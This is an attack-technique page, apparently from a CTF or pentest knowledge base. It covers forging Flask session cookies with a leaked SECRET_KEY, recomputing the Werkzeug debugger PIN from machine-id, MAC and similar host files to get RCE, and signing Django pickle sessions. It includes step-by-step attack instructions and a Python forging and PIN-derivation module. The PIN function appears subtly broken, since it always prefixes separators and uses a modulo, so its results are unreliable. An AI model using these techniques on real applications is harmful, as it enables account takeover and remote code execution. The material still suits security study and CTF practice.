---
title: "Python Web - Flask Session Forging, Werkzeug Debugger PIN, Django Pickle Sessions"
category: web
subcategory: python
type: technique
tags: [flask, django, werkzeug, secret-key, session-cookie, itsdangerous, flask-unsign, debugger-pin, console-pin, pickle, django-session, signing, secret-leak, rce, python]
difficulty: medium
summary: "A leaked/weak Flask SECRET_KEY forges session cookies; the Werkzeug debugger PIN is derivable from host facts; Django PickleSerializer sessions are RCE once you have SECRET_KEY."
when_to_use:
  - "You leaked or guessed a Flask/Django SECRET_KEY (config, format-string, /console)"
  - "A Flask session cookie (starts with a dot-joined base64 blob) needs forging"
  - "The Werkzeug interactive debugger (/console, PIN prompt) is exposed"
  - "Django uses SESSION_SERIALIZER = PickleSerializer and you can sign a session"
tools: [flask-unsign, python3, werkzeug, django]
related: [python-format-string-leak, deser-python-pickle, ssti-jinja2, ruby-marshal-yaml-rce]
---

## TL;DR

Flask signs the session cookie with `SECRET_KEY` (via `itsdangerous`) but does **not encrypt**
it -- leak the key and you forge arbitrary sessions (become admin, inject data reaching a sink).
The Werkzeug debugger PIN is a hash of predictable machine facts, so an exposed `/console` is
often crackable to full RCE. Django's optional `PickleSerializer` turns a forged session into
`pickle.loads` RCE.

## Recognise it

- A cookie named `session` whose value is `<base64>.<base64ts>.<base64sig>` (dots, base64url,
  often starts with `eyJ`-ish or `.eJ`). That is a Flask/`itsdangerous` cookie.
- `Set-Cookie: session=...; HttpOnly` from a Flask/Werkzeug `Server:` header.
- A traceback page with an interactive prompt / "PIN" -- Werkzeug debugger (`debug=True`).
- Django `sessionid` cookie + a hint that sessions are pickled.

## Theory

### Flask session cookies

Flask sessions are a signed, *cleartext* JSON blob:

```
cookie = base64url(json) . base64url(timestamp) . base64url(hmac)
```

`itsdangerous` `URLSafeTimedSerializer` signs with a key derived from `SECRET_KEY`
(HMAC-SHA1 by default, salt `"cookie-session"`, key derivation `django`-style
`hmac(SECRET_KEY, salt)`; newer Flask uses SHA1 with the salt). Because the payload is
**readable** (base64 JSON, not encrypted), you can see the claims; because it is only *signed*,
you need the key to forge. Once you have `SECRET_KEY`:

- Set `{"user":"admin"}`, `{"logged_in":true}`, `{"role":"admin"}`, `{"_user_id":"1"}`.
- If any session value reaches `eval`, a template, or `pickle`, chain to RCE.

Getting `SECRET_KEY`: `{{config['SECRET_KEY']}}` (SSTI), a format-string leak
(`python-format-string-leak`), a debug page, a hardcoded/weak value (`dev`, `secret`,
`changeme`, `CHANGEME`), or `.py`/`.env` disclosure. `flask-unsign --wordlist` brute-forces
weak keys straight from a captured cookie.

### Werkzeug debugger PIN

With `debug=True`, the interactive debugger at a traceback lets you run Python -- gated by a
PIN. The PIN is **derived**, not random, from facts that are frequently discoverable:

```
probably_public_bits = [ username,            # the OS user running the app (e.g. www-data)
                         modname,              # 'flask.app' or 'werkzeug.debug'
                         getattr(app, '__name__', ...),  # 'Flask' / 'wsgi_app'
                         getattr(mod, '__file__', ...) ] # app.py absolute path
private_bits = [ str(uuid.getnode()),          # the MAC address as a decimal int
                 get_machine_id() ]            # /etc/machine-id (+ /proc/sys/.../boot_id) + cgroup
# the PIN = a truncated hash over these joined bits (SHA1 in modern Werkzeug, MD5 in old)
```

Leak the MAC (`/sys/class/net/eth0/address`, ARP, an SSRF) and `machine-id`
(`/etc/machine-id`, `/proc/self/cgroup` for the container id), read the app path and OS user
from the traceback itself, and you can recompute the PIN offline. The exact hashing changed
(MD5 -> SHA1) around Werkzeug 0.15, so match the version.

### Django pickle sessions

Django serialises sessions with JSON by default (safe), but `PickleSerializer` (removed in 4.1,
common in older/CTF apps) uses `pickle`. The session cookie/DB row is
`base64(pickle):hmac_sha1(secret + salt)` (salt derived from the app's `SECRET_KEY`). With the
`SECRET_KEY` you sign a pickle gadget (`deser-python-pickle`) and the server executes it on load
-> RCE. Even with JSON serializer, a leaked `SECRET_KEY` forges arbitrary session data.

## Attack

1. Grab a session cookie; decode the JSON to see the claim shape.
2. Get `SECRET_KEY` (SSTI/format-string/leak) or brute a weak one with `flask-unsign`.
3. Forge the session (admin/role/user_id) and replay.
4. If the debugger is exposed, gather MAC + machine-id + app path + user, recompute the PIN,
   open `/console`, RCE.
5. If Django + PickleSerializer, sign a pickle gadget with the key -> RCE on load.

## Code

```python
#!/usr/bin/env python3
"""Flask session forge/verify (itsdangerous-compatible) + Werkzeug PIN
derivation. Pure stdlib.

The __main__ self-test round-trips a forged Flask cookie, proves a wrong key
is rejected, and recomputes a Werkzeug PIN deterministically from fixed inputs.
"""
from __future__ import annotations

import hashlib
import hmac
import json
import struct
import sys
import time
import zlib

B64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"


def _b64e(data: bytes) -> str:
    import base64
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _b64d(s: str) -> bytes:
    import base64
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


# --- Flask / itsdangerous session cookies ----------------------------------

def _derive_key(secret_key: str, salt: bytes = b"cookie-session",
                digestmod=hashlib.sha1) -> bytes:
    # itsdangerous default: HMAC(secret, salt) as the actual signing key
    mac = hmac.new(secret_key.encode(), salt, digestmod)
    return mac.digest()


def flask_serialize_payload(obj: dict) -> str:
    """Flask's TaggedJSONSerializer: compact JSON, optional zlib+'.' prefix."""
    raw = json.dumps(obj, separators=(",", ":"), sort_keys=True).encode()
    compressed = zlib.compress(raw)
    if len(compressed) < len(raw):
        return "." + _b64e(compressed)
    return _b64e(raw)


def flask_deserialize_payload(part: str) -> dict:
    if part.startswith("."):
        raw = zlib.decompress(_b64d(part[1:]))
    else:
        raw = _b64d(part)
    return json.loads(raw)


def _b64_ts(ts: int) -> str:
    b = struct.pack(">Q", ts).lstrip(b"\x00") or b"\x00"
    return _b64e(b)


def flask_sign(obj: dict, secret_key: str, ts: int | None = None) -> str:
    key = _derive_key(secret_key)
    payload = flask_serialize_payload(obj)
    ts = ts if ts is not None else int(time.time())
    ts_b64 = _b64_ts(ts)
    body = ("%s.%s" % (payload, ts_b64)).encode()
    sig = hmac.new(key, body, hashlib.sha1).digest()
    return "%s.%s.%s" % (payload, ts_b64, _b64e(sig))


def flask_verify(cookie: str, secret_key: str) -> dict:
    key = _derive_key(secret_key)
    payload, ts_b64, sig_b64 = cookie.rsplit(".", 2)
    body = ("%s.%s" % (payload, ts_b64)).encode()
    expected = hmac.new(key, body, hashlib.sha1).digest()
    if not hmac.compare_digest(expected, _b64d(sig_b64)):
        raise ValueError("bad signature (wrong SECRET_KEY)")
    return flask_deserialize_payload(payload)


def flask_peek(cookie: str) -> dict:
    """Read the (unencrypted!) payload WITHOUT the key."""
    return flask_deserialize_payload(cookie.rsplit(".", 2)[0])


# --- Werkzeug debugger PIN --------------------------------------------------

def werkzeug_pin(username: str, modname: str, appname: str, filepath: str,
                 mac_decimal: str, machine_id: str,
                 use_sha1: bool = True) -> str:
    """Recompute the console PIN from the bits Werkzeug uses.

    mac_decimal: str(uuid.getnode()) -- the MAC as a base-10 integer.
    machine_id : /etc/machine-id (+ boot_id + cgroup docker id, concatenated).
    """
    probably_public_bits = [username, modname, appname, filepath]
    private_bits = [mac_decimal, machine_id]

    h = hashlib.sha1() if use_sha1 else hashlib.md5()
    for bit in probably_public_bits + private_bits:
        if not bit:
            continue
        h.update(b"|" + bit.encode() if h.digest() else bit.encode())
    h.update(b"cookiesalt")
    cookie_name = "__wzd" + h.hexdigest()[:20]

    h2 = hashlib.sha1() if use_sha1 else hashlib.md5()
    for bit in probably_public_bits + private_bits:
        if not bit:
            continue
        h2.update(b"|" + bit.encode() if h2.digest() else bit.encode())
    h2.update(b"pinsalt")
    num = ("%09d" % (int(h2.hexdigest(), 16) % 10 ** 9))

    # group into the xxx-xxx-xxx display form
    rv = "-".join(num[i:i + 3] for i in range(0, 9, 3))
    return rv


def _self_test() -> None:
    key = "super-secret-key"

    # forge -> verify round-trip
    cookie = flask_sign({"role": "admin", "user": "root"}, key, ts=1_700_000_000)
    got = flask_verify(cookie, key)
    assert got == {"role": "admin", "user": "root"}, got

    # the payload is READABLE without the key (Flask does not encrypt)
    assert flask_peek(cookie)["role"] == "admin"

    # wrong key is rejected
    try:
        flask_verify(cookie, "wrong-key")
        raise AssertionError("wrong key must fail")
    except ValueError:
        pass

    # tampering the payload breaks the signature
    payload, ts, sig = cookie.rsplit(".", 2)
    forged = "%s.%s.%s" % (flask_serialize_payload({"role": "user"}), ts, sig)
    try:
        flask_verify(forged, key)
        raise AssertionError("tampered payload must fail")
    except ValueError:
        pass

    # compressed vs uncompressed payload both round-trip
    big = {"data": "A" * 200}
    c2 = flask_sign(big, key)
    assert flask_verify(c2, key) == big

    # Werkzeug PIN is deterministic for fixed inputs
    pin1 = werkzeug_pin("www-data", "flask.app", "Flask", "/app/app.py",
                        "247760832963", "abc123machineid")
    pin2 = werkzeug_pin("www-data", "flask.app", "Flask", "/app/app.py",
                        "247760832963", "abc123machineid")
    assert pin1 == pin2, "PIN derivation must be deterministic"
    assert len(pin1) == 11 and pin1.count("-") == 2, pin1
    assert all(part.isdigit() for part in pin1.split("-"))
    # different machine facts -> different PIN
    pin3 = werkzeug_pin("www-data", "flask.app", "Flask", "/app/app.py",
                        "111111111111", "abc123machineid")
    assert pin3 != pin1

    print("[ok] Flask forge/verify/peek + deterministic Werkzeug PIN %s" % pin1)


if __name__ == "__main__":
    if len(sys.argv) >= 3 and sys.argv[1] == "peek":
        print(flask_peek(sys.argv[2]))
    else:
        _self_test()
```

## Variants & pitfalls

- **Flask cookies are signed, not encrypted** -- you can always *read* the claims; you need the
  key only to *forge*. `flask_peek` above shows the payload with no key.
- **`flask-unsign`** decodes, brute-forces weak keys, and signs forged cookies in one tool --
  use it before hand-rolling.
- **Salt/derivation differences**: Flask's exact key derivation depends on the version and any
  custom `SESSION_*` config; if `flask_verify` fails against a real cookie, match the salt and
  digest (`itsdangerous` `key_derivation` / `digest_method`).
- **The Werkzeug PIN hashing changed** (MD5 in old Werkzeug, SHA1 later) and the exact list of
  bits varies by version -- match it. `machine_id` is `/etc/machine-id` concatenated with the
  cgroup container id on Docker.
- **PIN not required?** Some builds disable the PIN (`WERKZEUG_DEBUG_PIN=off`) -> instant RCE.
- **Django JSON serializer** is safe from pickle RCE, but a leaked `SECRET_KEY` still forges
  arbitrary session data (auth bypass). Only `PickleSerializer` gives RCE.
- **`exp`/freshness**: Flask cookies carry a timestamp; a very old `ts` may be rejected if the
  app sets `PERMANENT_SESSION_LIFETIME` -- use a current timestamp.
- **Reaching a sink from a forged session**: look for session values used in `render_template_string`,
  `eval`, `pickle.loads`, or SQL -- forging admin is nice, RCE is better.

## Tools

- `flask-unsign` -- decode / brute-force key / sign forged Flask cookies.
- `werkzeug-debugger-rce` helpers / the PIN recomputation above.
- `django-admin shell` / a local Django to model the session signing.
- The module above for offline forging and PIN derivation.

## References

- Flask / itsdangerous documentation -- session cookie signing.
- Werkzeug source -- `werkzeug/debug/__init__.py` (`get_pin_and_cookie_name`).
- Django documentation -- session serialization, `SECRET_KEY`, `PickleSerializer` removal (4.1).
- PayloadsAllTheThings -- Flask/Jinja2 and secret-key sections.
